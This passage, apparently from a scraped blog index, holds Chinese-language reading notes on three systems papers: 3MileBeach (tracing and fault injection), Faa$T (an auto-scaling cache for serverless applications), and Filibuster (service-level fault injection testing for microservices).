Serialize’。使用存储S来存储追踪的上下文对象Ctx。Ctx来源于现存的上下文传播机制，携带了请求的元数据。\n在入站组件中，3MileBeach从入站消息获取ID，并将ID分配给Ctx（算法1）。当服务handler发送请求时，3MileBeach将观测到的追踪数据（这个数据存在S中）附加在出站消息中（算法2）。下表中有相关的关键函数。\nSerialization Functions and Data Flows Direct Response Circle (DRC) 框架从上游服务或client接收请求； 入站组件唤醒Deserialize’将请求反序列化，将事件作为追踪记录，并存储到S中，将追踪元数据写到Ctx中； 框架调用服务handler并等待调用结束; 框架收到响应； 出站组件唤醒Serialize’，并从S中检索追踪Ctx的元数据，追加到发送事件，序列化响应； 框架返回响应到上游服务或client。 Synchronized Request-Response Circle (SRC) 服务handler通过阻塞函数调用发送一个请求到下游服务； 出站组件唤醒Serialize’，从S和Ctx中检索追踪数据，这些数据是微服务从上游服务或client的SEND事件中来的，模拟了故障信息。调用序列化函数对消息进行序列化； 框架发送请求给下游服务并等待响应； 框架收到下游的响应； 入站请求唤醒Deserialize将响应反序列化，追加事件并存储； 服务handler会接受响应。 Fault Simulation 3MileBeach通过模拟下游的外部可观测错误来实现故障注入，从请求者的角度来看，这些错误可能是由于网络问题或者返回响应的handler产生。\n3MileBeach不会因为故障测试而崩溃或者重启，因此可以执行并发测试，也能控制blast radius。\n典型的SRC包括两个服务和两个数据流。（Requester Responder ReqFlow RespFlow）。故障触发时，requester不能知道下游的故障根源，这取决于具体的实现，它能知道这些错误的返回码，例如timeout、connection closed、package loss等，依次证实的确发现了问题。\n3MileBeach在FICs定义的故障触发条件得到满足时触发故障。\n实验 测量3MileBeach框架的端到端的延迟来展示其效率表现，并提供两个本地案例。\n实验设置 演示程序：Hipster Shop，一个部署在GKE上的微服务程序。 客户端生成测试用例来进行跟踪和故障注入、应用性能调整及错误定位。 Hipster Shop 包含以下微服务：\nFrontend - Svc_fe CART - Svc_cart Recommendation ProductCatalog - Svc_p Shipping Currency - Svc_c Payment Email Checkout Ad - Svc_a 涉及到的序列化库有：\nJSON PROTOCOL RESTFUL GRPC GORILLA等 开发语言：\nGO C# Node.js Python Java 综上，可以看出这个应用很适合作为microservice的代表来对3MileBeach进行测试。\nClusters 集群情况如下：\nClient 客户端在不同级别的并发下向Svc_fe发送请求，使用N来确定并发数。同时，将应用和Client部署在一个集群上以最大程度减少网络延迟。\nTracing Benchmark 本部分涉及到链路追踪情况，主要考察增加链路追踪给系统带来的延迟上的开销。通过并发测量端到端延迟来比较。\n在进行追踪时势必会给系统增加开销，因此在这方面进行比较，与Jaeger框架进行比较。以下为延迟情况以及延迟和吞吐量之间的关系。\nFault Injection 为测试3MileBeach对TFI测试的速度，在Svc_fe中设计了两个bug：\nDEEPRLFI。它在Svc_a和Svc_c都关闭时可以触发，不受事件影响。所以需要使用3mb-payloads来同时触发Svc_a和Svc_c的崩溃。 SimpleTFI。是一个TOCTTOU bug。为了触发这个问题，需要让请求携带可以使Svc_c崩溃的3mb-payloads。 通过下面几个图详细说明：\n（a）第一次调用Svc_c，Svc_fe可以容错；若Svc_c可访问，Svc_fe会认为在整个过程中Svc_c都是可以工作的；反正，Svc_fe会执行回退策略，使用默认的价钱。注意红色！的位置，Currency没有正常返回数据，但Svc_fe最终仍可以正常运行完，参考最后的绿色箭头。使用RLFI去模拟Svc_c的崩溃可以得到对应的结果。\n（b）当Svc_a不可用时，Svc_fe会应用回退策略，使用默认的广告推荐，并继续向Svc_c发送请求进行结算。使用RLFI去模拟Svc_a的崩溃可以得到对应的结果。\n（c）由上面两张图看出，在Currency和Ad二者中，只有一个出现问题时并不会引发Frontend的崩溃。下图则表示当Ad和Currency都崩溃时，Fronted才会崩。\n","date":"2022-03-14T19:12:33+08:00","permalink":"https://lizonglingo.github.io/p/3milebeach-a-tracer-with-teeth/","title":"3MileBeach: A Tracer with Teeth"},{"content":" 来源：ACM SoCC'21\n作者：Microsoft Research\u0026amp;Stanford University\u0026amp;Microsoft Azure\n摘要 问题来源：FaaS平台依赖远程存储来维护状态信息，限制了FaaS应用的运行效率。\n难点：FaaS平台的一些缓存工作尝试解决这个问题，但是由于FaaS应用不同的特点，难以基于业务负载的弹性的调整缓存容量。\n解决方案：文章提出了Faa$T，一个自动伸缩的分布式FaaS缓存系统：\n每个FaaS应用有自己的缓存，在被调用、函数被激活时，应用程序从内存加载到缓存； 在下一次调用时，可以使用缓存将应用程序“预热”，加快访问速度（冷启动问题？）。 缩放依据：根据工作集和对象的大小管理缓存I/O带宽。\n实验表现：最大提高92%的FaaS应用性能表现（平均57%）。\n问题来源 FaaS内存回收和冷启动 FaaS厂商为控制效益，在function不工作时会将其从内存中卸载掉。\nStateless应用的状态维护依赖远端存储 FaaS function通常具有无状态的特点，但在业务中往往需要维护一些状态，例如以下场景：\n下一次函数的调用需要上一次调用的状态信息； 函数pipeline多阶段执行，一个函数的执行需要依赖另一个函数的结果； 这是现实的问题，现有的解决方案是将状态信息写到远端存储中（如Amazon S3），在需要时将其从远端存储读出来。\n而远端存储的一个不可避免的问题在于更高的延迟和更低的带宽，同时增加开销和管理成本。\n研究现状 本地缓存策略作为缓解上述问题的方案，已经有了初步的解决方案。\n现有方案存在如下不足 为多个应用实现单个缓存，忽略了FaaS应用程序的广泛不同特性。例如很多应用的调用频率非常低[48]，为这种应用实现缓存实际上没有必要；但是，如果不为这些应用配置缓存又会影响到服务质量。 先前的方案中，要么就是缓存大小是固定的，要么就是缓存伸缩仅根据计算负载。这些方案在数据访问模式稳定和工作集大小小于缓存容量时很有效。 没有考虑到大数据对象访问的问题，由于数据量大、VM/容器资源竞争、I/O带宽的限制，在访问大数据对象时会出现性能下降问题。在如机器学习推理这样的大数据量应用中，缓存的横向扩容能使这种服务的性能大大提升。 现有的缓存机制对用户来说不透明，需要明确的指定；要么就是提供了一个单独的API来访问缓存。这违背了FaaS平台让用户在管理不必要资源中解脱出来的初衷。 文章做的工作 文章表示，问题的根源在于，Serverless的Cache层从未实现真正的Serverless——与应用程序无感绑定、自动缩放、对上层用户透明。\nFaa$T的特性和作用 是内存层面的缓存； 每个应用将本地Faa$T缓存加载到内存中，缓存在应用程序运行时透明的管理程序所访问的数据； 应用从内存中被卸载时，Faa$T也会被卸载（对那些调用频率低的应用来说，在他们很长时间不被调用时，其缓存也会被卸载）； 该方法消除的对远程缓存存储的需求，减少远程流量开销，降低成本； 针对不同的应用提供不同的替换策略和维持策略； 应用重新加载时可以预先将最常用的数据加载至缓存中。 对缓存的扩缩容策略的方案是：a）为从远程存储中获取大对象增加传输带宽；b）增加经常访问的远程数据的整体缓存大小。 对于分布式缓存存储，默认是强数据一致性，一致性和扩展策略也支持自定义。 Contributions 通过FaaS提供商的工作负载，总结了数据访问模型； 设计和实现了Faa$T，一个透明的FaaS应用自动扩缩容缓存； 提出Faa$T扩展策略，根据数据访问模式和对象大小调整带宽和缓存大小； 拓宽了可以在FaaS上以接近本机性能运行程序的范围，如ML程序和Jupyter notebook。 对FaaS应用和缓存的分析 表征当前的FaaS应用 文章收集了一段时间内FaaS Provider的日志数据，信息如下。\n数据大小 包括20.3million不同的对象，大小有1.9TB。数据访问模式分布如下图：\n80%的数据大小小于12KB；\n有25%的数据小于600B；\n也有很少的一些数据大于1.8GB；\n对数据的读取次数远远大于对数据的写入次数；\n虽然应用到后端数据存储有较大的带宽，但对小数据对象大量的访问加剧了存储延迟。\n数据访问和重用 下图展示了FaaS应用每次调用访问不同的Blobs（一个存储系统）的比率。\n大部分应用被调用时只访问一个单独的存储； 约11%的应用被调用时访问多个存储系统； 超过32%的应用在多次数据访问中访问同一个Blob，更有7.7%的应用在100次调用中访问同一个Blob，还有一个应用在1000次调用中访问一个Blob； 大多数应用会使用不超过100个不同的Blobs； 所有的数据访问一共涉及到2.6TB的数据，而所有的数据语料只有1.9TB； 这意味如果缓存已访问过的数据会节省27%的流量和54.3%的远程存储； 跨应用、用户和地区的数据共享情况极为罕见。 时间访问模式 下图展示了每个应用访问Blob的时间维度的模式：X轴是读写Blob函数的调用次数，Y轴是这些调用的到达间隔时间的变异系数（CoV， coefficient of variation），每个点代表具有3次访问次数以上的blob（少于三次不能计算变异系数）。\nCoV为1表示到达间隔呈泊松分布，接近0表示周期性到达，大于1表示比泊松到达更大的突发性。\n可以看出，多数时间访问模式具有突发性的特点。 访问性能 写操作通常快于读操作（因为写入操作使用到了buffer，而且不需要在所有实例间同步持久化数据，读数据需要等待存储处理数据）； 较小的Blob的吞吐量相对较低，因为握手的开销相对于数据量来说过大。 多样的调用模式 调用模式的差异较大，81%的应用平均每分钟最多调用一次，更有45%的应用每小时平均调用一次； 不到20%的应用产生了99%以上的调用次数，这与在日志中的数据表现一致。 这就带来一个问题，为这些调用次数很少的应用缓存数据可能是浪费的，但这又关系到大部分用户体验。\n其他发现 超过30%的请求调用相同的数据，这意味着缓存在数据复用上可以产生效果； 访问的数据大小跨越了9个数量级，从bytes到GBs； 函数调用的频率也有9个数量级的不同。 缓存分析 如果缓存可以起作用，那么应满足如下三个关键条件：\n数据访问有良好的时间局部性和重用； 应同时适用于调用频繁和调用次数很少的应用； 缓存应利用空间局部性尽可能减少访问大数据对象的开销。 根据后续分析，还应有以下的特点：\n缓存还应和应用程序进行绑定，不需要独立管理； 缓存还需要对用户透明，并且没有代码入侵性； 有多样的伸缩策略，如：a）根据应用负载变化扩展能力？，b）根据数据重用模式改变缓存大小，c）基于访问的数据对象大小改变远程存储带宽。 现有的缓存系统的局限性 下图是一些缓存系统的表征：\n缓存系统和应用是分离的，缓存系统独立管理，当应用在内存中卸载时，用户需要额外管理缓存状态或缓存所在的服务，所以缓存还应和应用程序进行绑定； 需要进行配置，并表现出代码入侵的现象，需要改动代码来使用缓存，所以缓存还需要对用户透明，并且没有入侵性； 在伸缩上仅基于计算负载，但实际的工作情况更加负载，文章建议是缓存层的弹性应考虑以下几点：a）根据应用负载变化扩展能力？，b）根据数据重用模式改变缓存大小，c）基于访问的数据对象大小改变远程存储带宽。 为现有FaaS平台扩展新的应用类型 机器学习推理pipeline 许多业务如健康检查、广告推荐、零售都依赖机器学习。FaaS的按需计算和伸缩很适合ML这种工作负载难以预测的应用。但机器学习需要较低的时延，例如实时人脸识别的需求。下图是一个应用场景：\n完成这一个场景通常需要秒级的性能甚至不超过1s。文章将上述场景部署在本地的虚拟机和真实的FaaS生产环境中，下图表明在FaaS平台上的速度比本地慢3.8倍，同时可以看出存层存储层的低效是造成延迟的最大因素：\nJupyter notebooks 为验证Jupyter notebooks的性能，文章将其移植到FaaS平台，叫做JupyterLess。每一个cell被看作一个function被调用，cell之间的状态通过共享的中间存储层来保存。文章使用了一个350MB的DataFrame，共10个cell，在本地虚拟机和FaaS平台上进行比较。\n由于存在加载中间存储和从远程存储拉取DataFrame的问题，JupyterLess比本地慢63倍。\nFaa$T设计 Faa$T缓存在函数执行期间访问的对象，以便可以跨调用重用数据对象。不需要外部存储层和额外的服务，因此可以透明的绑定到应用上（而且是语言无关性）。\n当应用被卸载时，Faa$T收集有关缓存对象的元数据，并在程序重新加载到内存时用其预热缓存中常被访问到的对象，这对调用频繁的应用有很大的帮助。\nFaa$T的自动缩放依赖三个方面：\n基于一个应用每秒被调用的次数，对那些调用频繁的应用非常有必要；（计算维度的伸缩） 基于数据重用模式，对涉及到大数据量、大工作集的应用很有必要；（缓存容量维度的伸缩） 基于数据对象大小，以扩展远程存储访问的带宽资源，加速应用和远程存储之间的网络I/O；（网络带宽维度的伸缩）。 在应用加载到内存后，Faa$T使用一致散列有效的跨实例定位对象，无需大量的位置数据。\n系统架构 下图展示了FaaS平台上的Faa$T的架构：\nFaa$T和应用是一对一的，共同运行在FaaS Runtime中； Cachelet通过Member Daemon交互，确定数据对象的位置和所有者，所有者负载上传和下载远程数据对象； Load Daemon收集缓存对象的元数据，并用来决定在加载应用程序时需要预热哪些数据对象； Memory Darmon用来监控函数和缓存的内存消耗，避免内存占用导致应用出现问题； Frontend负责将请求负载均衡，Scale Controller负责根据运行时指标来增减实例数量。 访问和缓存数据 读操作 下图为读数据操作:\nlocal hit：在本地的Faa$T数据缓存中命中； local miss：本地的Faa$T缓存中不存在要访问的数据，cachelet会从远程仓库中寻找数据； remote hit：在本地的Faa$T缓存中没有找到数据，但是在该数据的所有者的缓存中找到数据； remote miss：在本地缓存和数据对象所有者的缓存中均没有命中。 Faa$T使用一致哈希确定对象所有权。\n写操作 当应用程序需要输出数据时，Faa$T会直接写入数据所有者缓存；\n执行该函数的实例将数据发送到所有者缓存，然后将其写入远程存储；\n写缓存和写远程存储是同步写入的。\n这保证了所有者始终拥有应用数据的最新版本。应用程序可以将 Faa$T配置为异步写入或根本不写入远程存储。因为Faa$T绑定到每个应用程序，不同的应用程序可以同时使用不同的策略。\n一致性 下图展示了可能发生的读写设置、性能和一致性表现、还有容错情况：\n默认在读对象时，先验证缓存的版本是否与远程存储的版本是否匹配，在此期间不发生数据传输；如果匹配，不再检索对象是否发生变动，这种验证提供了强一致性保证。\n但有些应用会放弃强一致性来换取性能。此时，Faa$T可以读取任何缓存版本并异步写入远程存储。这样只能保证最终一致性，允许在某些时刻存在数据不一致的表现。\n还有，应用程序也可以完全跳过写入远程存储并依赖分布式缓存。\n数据预热 为达到这一目的，Faa$T在应用被卸载时，记录了有关缓存的元数据。包括：\n缓存对象的大小； 数据对象的版本； 每个访问类型的次数（local hit、remote miss等）； 对象的平均访问间隔时间等。 使用卸载时间为时间戳，为收集的每个元数据进行标记，以捕获缓存的状态历史。\nFaa$T需要决定何时将应用加载到内存中，这里使用了混合直方图策略[48]，直方图跟踪应用调用之间的空闲时间，当应用被卸载时，使用直方图预测下一次调用可能到达的时间，并在该事件之前重新加载应用。这也适用于解决冷启动问题。\n同时，Faa$T也需要决定将哪些数据对象被加载到新的cachelet中。使用下面两个条件确定需要加载的对象：\n对象的local或remote命中率大于阈值，就加载该对象； 在记录的元数据中多次设计一个对象，就加载该对象。 在Faa$T中清除数据 FaaS应用所拥有的内存是事先规定好的，当函数和缓存对象消耗的内存达到一定数量时，就会将部分数据对象从缓存中剔除。\n这里文章实现了两种策略。\nLRU最近最少使用； 目标对象的大小大于阈值。 如果需要更多的内存，那么就先使用策略2，再使用策略1。\nFaa$T扩缩容 Scale Controller监控了端到端性能和每个应用的工作负载。它也会周期性的询问每个应用是否需要投票以增减实例，正数表示增加实例，负数表示减少实例。\nFaa$T有三种缩放类型。\nCompute Scaling 基于请求数量、请求处理队列的大小以及平均响应时间，来扩展实例数量。\n服务性能下降、请求率过高或者处理队列过长，都会使实例数量增加，反之会减少实例数量。\nCache size scaling Faa$T还可以拓展来匹配工作集大小。例如JupyterLess的一个数据密集型难以提高缓存命中率，因此换入、换出的概率非常高。为解决这个问题，cachelet会跟踪缓存对象换入换出的次数，如果发现这样的情况经常发生，就扩大缓存容量。反之，缩小缓存容量。\nBandwidth scaling Faa$T 还支持具有大型输入对象的应用程序。对于此类对象，Faa$T 将远程存储的下载平均分配到多个缓存中，以达到两个目的：\n为远程存储创建更高的累积 I/O 带宽； 利用实例之间更高的通信带宽（与每个实例和远程存储之间的带宽相比，实例间的带宽更好，网络I/O更有效率）。 当cachelet接收到对象访问时，使用如下公式计算多个实例和对象大小S的数据传输延迟$T_{DR}$:\nN：实例数量； S：对象的大小； $T_{Load}$：实例加载的延迟； $BW_{BS}$和$BW_{Inst}$：记录不同的网络和远程存储的带宽。 迭代过程在$T_{DR}$的变化小于10%或$T_{DR}$在迭代过程中增加时停止。\nHandling conflicting scaling requests 当扩缩容策略发生冲突时，控制器会优先处理扩容策略，因为这样更加保守。但是，如果所有策略都表明缩减实例不会导致问题时，就会缩容。\nIdle function computation resources 在一些情况，实例数量扩容可能会导致资源浪费。此时可以将一些低优先级的任务拿出来运行。\n实现 生产级别的FaaS平台 应用包含一个或多个功能，Faa$T透明的加载和管理对象：触发器（接收http request）、数据输入（blob）、输出（消息队列）。用户可在使用时配置Faa$T的一些策略，如扩展策略、一致性策略、缓存置换策略等。\n下图展示了应用实例、FaaS Runtime还有function在VM或Docker Container中运行：\n接收到请求； Runtime收集请求输入并调用function，将参数传递； function处理完后，将结果返回给Runtime； Runtime继续执行，如将数据写入远程存储或消息队列。 缓存数据 运行时和function使用持久的RPC进行控制和数据交换。共享内存时Faa$T缓存数据的地方，通过传递共享内存中数据的地址，减少端到端时延。\n当运行时在调用函数前，准备进行数据绑定时，Faa$T先拦截并检查缓存。当函数产生输出时，Faa$T会缓存起来备用。\n实验评估 两个比较点 Faa$T给应用带来的性能提升； 评估四种缓存访问情况：local hit、local miss、remote hit、remote miss。 六个基准 本地的大型虚拟机，所有访问都在本地进行； 没有集成Faa$T的大型FaaS平台Vanilla，对象的访问都在远程存储，它的最佳性能表现等同于Faa$T LM； InfiniCache[55]（IC），为远程实例配置Faa$T，类比Faa$T RH； Cloudburst（CB）的存储层，最佳实例表现等同Faa$T LH； Pocket，近似于手动管理的Redis VM，所有数据均已内存速度访问； 商业级Redis服务。 两个应用 ML推理应用； Jupyter notebook。 主要以程序延迟和成本为指标。对ML应用，使用单模型和带有pipeline的推理。\n对于单模型，使用了两个不同的模型，在资源使用和延迟上都有所不同：\nSqueezeNet，5MB； AlexNet，239MB。 带有推理管道的模型使用了上面提到的识别汽车和人脸的应用，边界模型（35MB）的输出被输入到人体识别（97MB）和汽车识别（5MB）的模型中。\n对于 JupyterLess，有5个notebooks：\n单消息日志记录； 对 350MB 的 DataFrame 列求和； 进行数据收集和绘图的能力规划； FaaS数据表征特征； 计数到 1K。 函数数据对象由每个单元执行后的笔记本状态组成，以 JSON 格式存储。\n结果 ","date":"2022-03-07T15:48:15+08:00","permalink":"https://lizonglingo.github.io/p/faat-a-transparent-auto-scaling-cache-for-serverless-applications/","title":"Faa$T: A Transparent Auto-Scaling Cache for Serverless Applications"},{"content":" 来源：ACM SoCC'21\nhttps://acmsocc.org/2021/accepted-papers.html\n摘要——为什么需要服务级别的故障注入测试 由于微服务架构的特点，负责每个模块的工程师只需专注自己的部分而不需要过多关注整个应用系统。这些应用程序的开发人员不一定都是分布式系统工程师，因此无法预计系统出现部分故障：一旦部署到生产环境中，他们的服务会面临一个或多个依赖项不可用的问题。\n作者提出了一种称为服务级故障注入测试的方法和一种称为 Filibuster 的原型实现，可用于在微服务应用程序开发的早期系统地识别弹性问题。\nFilibuster 将静态分析和 concolic-style 执行与一种新颖的动态缩减算法相结合，以扩展现有的功能测试套件，以最少的开发人员工作量覆盖故障场景。\n并使用 4 个真实工业微服务应用程序的语料库来进行实验。\n贡献 一种测试微服务应用程序弹性的方法：服务级故障注入测试 (SFIT) 结合了静态分析和 concolic 测试，以探索微服务之间所有可能的故障，从现有的通过功能测试套件开始。 一种新颖的动态缩减算法： SFIT 使用一种算法，通过利用将应用程序分解为独立的微服务来减少搜索空间的组合爆炸。 实现了SFIT的原型Filibuster：这个基于 Python 的工具可用于测试与 HTTP 通信的服务。我们的原型允许在本地测试服务的弹性，并证明它可以在 Amazon CodeBuild CI/CD 环境中运行，以便在问题进入生产之前检测它们。 用 Python 实现的微服务应用程序和错误的语料库：该语料库包含 8 个小型微服务应用程序，每个应用程序都展示了微服务应用程序中使用的单一模式；和 4 个从公开会议演讲中重新实现的行业示例：Audible、Expedia、Mailchimp 和 Netflix。 在该语料库上对Filibuster进行评价：证明 Filibuster 可用于识别语料库中的所有错误。我们展示了通过动态缩减可能进行的优化，并提供了有关如何最好地设计微服务应用程序以实现可测试性的见解。 难点 缺乏开源微服务工业应用程序及其相关的错误报告（这两个主要的语料库通常有助于软件测试领域的研究），回答这些错误是否可以在开发过程的早期检测到的问题并不简单。\n最终作者构建了4个案例语料库。\nAudible：一家提供有声读物流媒体移动应用程序的公司。在他们的演示文稿中，他们描述了一个错误，即应用程序服务器在从 Amazon S3 读取数据时不会收到 NotFound 错误。此错误在代码中未处理，并通过一般错误消息传播回移动客户端。他们使用混沌工程发现了这个错误。\nExpedia：一家提供旅行预订的公司。他们讨论了使用混沌工程来验证如果他们的应用程序服务器尝试从基于相关性对它们进行排序的服务中检索酒店评论，并且该服务不可用，他们将回退到另一个提供按时间排序的评论。\nMailchimp：一款用于电子邮件通讯管理的产品。在他们的演示中，他们讨论了两个错误。\n遗留代码无法处理其数据库服务器返回的指示其为只读情况的错误代码。 一项服务变得不可用并将未处理的错误返回给应用程序。 Netflix：讨论了他们使用混沌工程基础设施发现的几个错误。\n错误配置的超时，某个服务调用不正确配置，导致请求花费比预期更长的时间，但保持在超时间隔内。 服务配置了回退指向错误的服务。 关键的为服务没有配置回退。 架构概述 SFIT 采用开发人员优先的方法，尽早将故障注入测试集成到开发过程中，而无需开发人员使用特定的规范语言编写规范。\nSFIT 建立在开发微服务应用程序的以下三个关键点上。\n微服务独立开发：由于微服务之间可以通过约定的API进行通信，负责其他模块的个别团队成员通常不能很好地理解超出其控制范围的服务的状态或内部结构，无法编写应用程序的详细规范以使用模型检查器自动验证它。 Mock测试可以防止问题出现：虽然编写模拟测试可以查出一些问题，但是由于这费时费力，对开发来说效益太少，所以开发人员很少进行测试。 功能测试的重要性：开发人员编写多个验证应用程序行为的端到端功能测试，而不是编写规范。任何成功的故障注入方法都应该从功能测试开始。 SFIT的实现思路 基于上述三个关键点及下面的两个简单假设：\n服务通过HTTP进行通信。 一个单一的功能测试可以实现所有应用程序行为。 测试流程概述 假设从一个通过的功能测试开始，该测试由开发人员编写，在一些未失败的场景下执行应用程序，并验证一些应用程序行为。我们假设通过测试已经排除了逻辑错误。 在该测试点注入故障。如果请求出现多种错误，则为每一个错误安排一次测试。这些后续执行被放置在堆栈上，并递归地应用该策略，直到所有路径都被探索。这种算法的灵感来自于DART的concolic测试算法[28]。 以Audible App的例子来说，第一个请求发现内容分发服务出现了Timeout or ConnectionError。然后我们向堆栈中追加两次测试执行。 接着对内容分发服务进行堆栈中的测试，如果测试中暴露出新的问题，就可以寻找新的错误路径，内容交付引擎的故障可能会导致另一条路径暴露给日志服务。我们继续探索，直到所有的道路都被充分探索。（如：内容交付引擎的故障可能是由于日志服务暴露出的问题，因此搜索到日志服务路径。 在本例中，多个服务具有相互依赖关系；例如，音频下载服务与所有权服务、激活服务和统计服务对话。在这种情况下，我们必须安排覆盖整个失败空间的执行——每个服务可能独立失败的所有方式，以及由于微服务相互影响而导致失败的所有组合。在第4节中，我们将讨论如何减少冗余的路径搜索。\n此外，在进行故障注入测试时，需要根据故障情况调整功能测试。为此作者开发了帮助组件使得开发者可以编写条件断言来判断错误的出现。还提供了一个机制来重现错误。\n故障注入 该注入方法可以对远程调用继续注入，并通过远程库改变响应。例如一些HTTP、gRPC的库。故障注入的设计思路如下：\n不返回远程服务的实际响应 基于注入的故障返回故障响应（通过修改远程服务响应） 故障识别 故障识别主要包含识别具体的故障和识别故障发生于哪一个微服务。\n注入的故障类型都源自于微服务可能发生的故障类型。通常有以下两种错误：\n服务调用端故障。如Python的request库在发出请求时会有23中意外情况。可以通过指定包含异常的模块或者配置中手动指定这些问题，依此识别故障。这里作者将该类请求中的Timeout和ConnectionError作为主要考虑的错误类型。 被调用端故障。被调用的服务也可能返回一个错误响应。例如一个服务依赖的另一个微服务抛出了Timeout，那这个服务就可能返回500。作者通过对程序源码使用静态分析技术对类似的响应进行识别。例如在Flask框架中查找return或raise语句。 但还存在一个问题：在使用HTTP做请求时，请求的URL并不能作为识别服务本体的标识。为解决这个问题，使用额外的工具记录调用的服务。该工具放置在接收服务请求的Web框架上，因此可以在被调用之前记录被调用者的服务信息。在获取该被调用者的信息后，将信息传给中台，以便进行后续的测试。\n注入故障后对功能的调整 开发者需要根据故障注入的结果去调整功能，修复没有考虑到的问题。作者提供了一个帮助模块去编写故障断言，例如：\nif a fault was injected on Service A { ... } 对系统行为在失败的情况下进行捕获和处理。开发人员应将这些条件断言添加到现有的功能测试中。\n一个典型的流程如下：\n开发者进行功能测试并通过。 注入故障 原有的功能测试因为故障的注入出现问题 开发者通过提供的帮助工具，可以对新出现的故障进行断言，从而捕获因故障注入出现的故障。例如：Audible会报出if a fault was injected on the stats ser-\rvice, the service should still play the audiobook.。基于此，开发者可以使用反例来重现先前的测试，以证明这些断言。 故障搜索路径动态缩减 为了识别尽可能多的错误，必须理想地探索服务失败的组合。为了实现故障空间的最大覆盖所需的测试执行次数是非常多的。\n但是，可将应用分解成多个独立的微服务来显著减少搜索空间并且保证完整性。以下图为例：\n对于ADS服务 先只考虑服务子集的故障，如ADS下载服务和CDS内容分发服务以及他们的依赖项。 对于ADS可能产生的故障，需要考虑三种依赖类别： Ownership：验证某个用户是否拥有某本书的所有权； Activation：验证用户的请求； Stats：对本次事件改变的状态进行记录； 如果上面三个依赖服务中的任何一个出现失败，那么ADS服务就会返回错误。但需要注意，Stats的失败不会影响这次请求的结果（因为“where stats failures are ignored”）。 因此，Ownership和Activation的失败会导致ADS返回500，但Stats的失败不会影响ADS，如果Ownership和Activation成功而Stats失败，ADS仍返回200。 对于CDS服务 CDS服务依赖的微服务子集是Asset Metadata和Audio Assets，我们需要考虑这两个服务会发生的故障以及他们组合起来会发生的故障。 但是，由于ADS的请求URL/user/\u0026lt;uesr_id\u0026gt;/books/\u0026lt;book_id\u0026gt;与Stats的URL相同，又因为CDS服务依赖于ADS服务，所以也应当将Stats服务考虑进去。 所以实际包含的CDS子服务应是：Asset Metadata+Audio Asset+Stats。 三条准则 充分考虑服务依赖项的所有失败方式，让我们知道每个服务和多个依赖服务失败时会发生什么行为，返回什么结果。 我们需要明确将故障注入后会对服务产生什么样的影响，并依据此简化注入。例如我们已经知道CDS的某个依赖项在发生错误时会返回500，那么就可以直接在CDS中注入500错误响应。 如果已经在服务中注入了故障，那么就不用进行测试了，因为已经观察到了程序的行为。 动态缩减算法 该算法将测试的搜索空间指数级缩小，基本思路是：\n缩减前：数量级是服务请求总数 缩减后：数量级变成给定服务最大能发出的请求数 具体来说如图2：\n缩减前：最大有8条边需要处理，整个应用有8个请求路径 缩减后：最大仅需要处理3条边，因为ADS是依赖项最多的服务，有3个请求发送路径 另外依据的一个前提是，微服务调用链拓扑结构上深度优先比广度优先更为明显。\n原型实现：Filibuster 使用Python及相关的开源组件，如使用opentelemetry来实现请求链路追踪、识别服务依赖关系。\n组件功能 系统的组件可以实现服务请求识别、服务依赖关系分析，并于Filibuster通信。服务器负责在本地进程、Docker Compose 或 Kubernetes 中启动与应用程序关联的所有服务。运行功能测试、记录和维护要执行的测试执行堆栈、执行功能测试断言、报告测试失败并聚合测试覆盖率。服务器提供了一个 API，功能测试可以使用该 API 来编写条件断言，并使用反例文件允许测试重放。测试覆盖率由服务器从每个单独的服务中聚合而成。\n静态分析 Filibuster需要进行静态分析，以识别每个服务可以返回的错误类型。作者使用词法分析技术，遍历源代码的抽象语法树来识别错误。Flask中的raise语句可以被分析道，然后捕获这些语句要发送的HTTP错误响应及状态码。\n注入故障 Filibuster可以注入下面类型的故障；\n调用端异常：这些异常由request库抛出，如指示Timeout的等错误。 响应异常：来自被调用端返回异常。 应用语料库 一个包含8种变体示例的电影订票程序，每个示例都展示了微服务应用程序中观察到的特定模式。还有 4 个行业示例：Audible、Expedia、Mailchimp 和 Netflix。\n每个示例都包含单元测试以及验证应用程序功能行为的功能测试。这些示例可以在Docker或K8s环境中运行。\n电影院订票应用示例 该应用由4个微服务组成：\nShowtimes: returns the show times for movies; Movies: returns information for a given movie; Bookings: given a username, returns information about the bookings for that user; Users: 存储用户信息并处理用户订票请求，并在过程中为用户展示电影信息。 它的另外7个变体有：\nbookings talks directly to the movies; same as 1, but the users service has a retry loop around its calls to the bookings service; same as 1, but each service talks to an external service before issuing any requests, the users service makes a request to IMDB, the bookings service makes a request to Fandango, the movies service makes a request to Rotten Tomatoes; all requests happen regardless of failure; in the event of failure, a hardcoded, default, response is used; adds a second replica of bookings, that is contacted in the event of failure of the primary replica; same as 5, but the users service makes a call to a health check endpoint on the primary bookings replica before issuing the actual request; example is collapsed into monolith（单体结构） where an API server makes requests to the it with a retry loop. 工业级应用 Audible 架构如上图2所示。包含如下服务：\nContent Delivery Service (CDS): IN： book_id 和 user_id OUT：（在验证之后） 音频内容和元数据 Content Delivery Engine (CDE): IN： book_id 和 user_id OUT：相关CDS的URL Audible App：模拟移动应用 首先向CDE请求获得内容的URL 再根据URL请求CDS Audible Download Service: 鉴权、授权并记录日志 IN： book_id 和 user_id OUT：权限鉴别结果 Ownership: 验证读者对图书的所有权 IN：book_id 和 user_id OUT：鉴权结果 Activation：为用户激活DRM许可证 IN：book_id OUT：DRM Access Stats：记录读者和图书许可的信息 IN：book_id 和 user_id OUT：记录结果 Asset Metadata：存储音频元数据，如章节信息 IN：book_id 和 license OUT：检索到的音频XML信息 Audio Assets：提供音频存储服务 IN：book_id 和 license OUT：检索到的音频文件 作者在实际部署上进行了一些调整：\nAsset Metadata和Audio Assets是 AWS S3 存储桶。为了模拟这一点创建 HTTP 服务，如果可用，则返回包含资产的 200 OK，如果资产不存在，则返回 404 Not Found。 Ownership和Activation是 AWS RDS 实例。为了模拟这一点创建了实现 REST 模式的 HTTP 服务：如果用户不拥有该书，则返回 403 Forbidden，如果该书不存在，则返回 404 Not Found，否则返回 200 OK。 Stats 服务是一个 AWS DynamoDB 实例。为了模拟这一点，我们创建了一个返回 200 OK 的 HTTP 服务。 对于功能测试的尝试是为用户下载有声读物的测试。如果缺少图书的章节信息，Asset Metadata可以返回 404 Not Found 响应：这是 Audible 演示中讨论的错误，会导致在移动应用程序中向用户显示一般错误。\nExpedia 包含如下三个微服务：\nReview ML：按相关性顺序返回评论 Review Time：按时间顺序返回评论 API Gateway：根据服务可用性，从 Review ML 或 Review Time 将评论返回给用户 Mailchimp 包含五个微服务：\nRequestmapper：将电子邮件活动中的 URL 映射到实际资源 DB Primary：数据库的主要副本 DB 